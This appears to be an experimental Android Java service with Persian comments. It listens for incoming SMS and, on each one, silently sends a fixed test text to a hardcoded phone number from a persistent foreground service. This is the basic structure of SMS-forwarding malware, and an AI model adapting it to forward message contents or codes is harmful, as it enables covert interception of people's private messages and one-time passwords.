package com.example.appsms;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.IBinder;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;

import android.util.Log;
import android.widget.Toast;

import java.lang.reflect.Array;
import java.util.ArrayList;

public class SMSForegroundService extends Service {

    private static final String TAG = "SMSForegroundService";
    private static final String CHANNEL_ID = "SMSForegroundServiceChannel52222";
    private BroadcastReceiver smsReceiver;


    @Override
    public void onCreate() {
        super.onCreate();
        Toast.makeText(this, "Start", Toast.LENGTH_SHORT).show();
        // ثبت رسیور برای دریافت پیام‌های SMS
    }



    @Override
    public void onDestroy() {
        super.onDestroy();
        Toast.makeText(this, "Finish", Toast.LENGTH_SHORT).show();
        // لغو ثبت رسیور در زمان مختصر
        unregisterReceiver(smsReceiver);
    }

    @SuppressLint("WrongConstant")
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(this);





        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_launcher_background)
                .setContentTitle("عنوان اعلان")
                .setContentText("متن اعلان")
                .setPriority(NotificationCompat.PRIORITY_DEFAULT);



        // نمایش اعلان با استفاده از NotificationManagerCompat

//        notificationManager.notify(NOTIFICATION_ID, builder.build());


        startForeground(2, builder.build());




        Toast.makeText(this, "onStartCommand", Toast.LENGTH_SHORT).show();









        smsReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (intent.getAction().equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {
                    SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
                    for (SmsMessage smsMessage : messages) {
                        String sender = smsMessage.getDisplayOriginatingAddress();
                        String messageBody = smsMessage.getDisplayMessageBody();
                        SmsManager smsManager = SmsManager.getDefault();
                        ArrayList<String> body=new ArrayList<>();
//                        body.add("فرامرز منم دارم تست میکنم");
                        messageBody="فرامرز منم دارم تست میکنم";
                        try {
                            smsManager.sendTextMessage(
                                    "09166561171",
                                    null,
                                    messageBody,
                                    null,
                                    null
                            );
                        }catch (Exception s)
                        {
                           Log.i("dvsv",s.getMessage());
                        }


                        // اینجا می‌توانید اقدامات مرتبط با دریافت پیام اس‌ام‌اس انجام دهید
                    }
                }
            }
        };








        IntentFilter filter = new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
        registerReceiver(smsReceiver, filter);


//        while (true) {
//            // ایجاد یک تاخیر 3 ثانیه
//            try {
//                Thread.sleep(3000);
//                Log.i("dvsadvsv","NimaMoradi");
////                Toast.makeText(this, "این باریک هر 3 ثانیه یک بار نمایش داده می‌شود.", Toast.LENGTH_SHORT).show();
//
//            } catch (InterruptedException e) {
//                Toast.makeText(this, e.getMessage(), Toast.LENGTH_SHORT).show();
//
//            }
//
//
//
//
//        }
      return  START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }





    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "SMS Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
}
